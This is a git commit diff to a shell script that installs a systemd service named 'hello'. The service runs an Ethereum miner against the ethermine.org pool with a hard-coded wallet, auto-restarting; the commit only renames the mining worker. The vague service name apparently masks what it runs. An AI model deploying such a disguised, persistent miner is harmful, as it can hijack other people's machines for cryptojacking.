af6f34c979a325c3b8a60b6f05787c3500e03377
kalinh <taikhoanxzc004@gmail.com>
2021-09-14 21:25:56 +0700

    Update mlkhieu.sh

--- mlkhieu.sh
+++ mlkhieu.sh
@@ -5,7 +5,7 @@ cat > /lib/systemd/system/hello.service <<EOL
 Description=hello
 After=network.target
 [Service]
-ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x196e997361ed2488884ce9226fd5909a86fa53c7.g7 -p x
+ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x196e997361ed2488884ce9226fd5909a86fa53c7.newml -p x
 WatchdogSec=1800
 Restart=always
 RestartSec=60
